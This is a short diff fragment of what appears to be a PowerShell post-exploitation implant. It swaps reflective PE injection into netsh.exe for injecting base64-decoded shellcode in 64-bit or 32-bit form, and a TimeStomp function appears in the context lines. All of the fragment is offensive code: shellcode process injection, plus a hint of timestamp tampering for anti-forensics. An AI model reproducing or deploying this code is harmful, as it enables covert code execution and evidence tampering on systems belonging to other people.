@@ -576,10 +576,10 @@ if (($p = Get-Process | ? {$_.id -eq $pid}).name -eq "powershell") {
     $t=$true
 }
 if ($t -and [IntPtr]::size -eq 8){
-    invoke-reflectivepeinjection -payload x64 -NewProcess c:\windows\system32\netsh.exe
+   Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode64))
 } 
 elseif (($t -and [IntPtr]::size -eq 4)) {
-    invoke-reflectivepeinjection -payload x86 -NewProcess c:\windows\system32\netsh.exe
+    Inject-Shellcode -x86 -Shellcode ([System.Convert]::FromBase64String($Shellcode86))
 }
 }
 Function TimeStomp($File, $Date) {
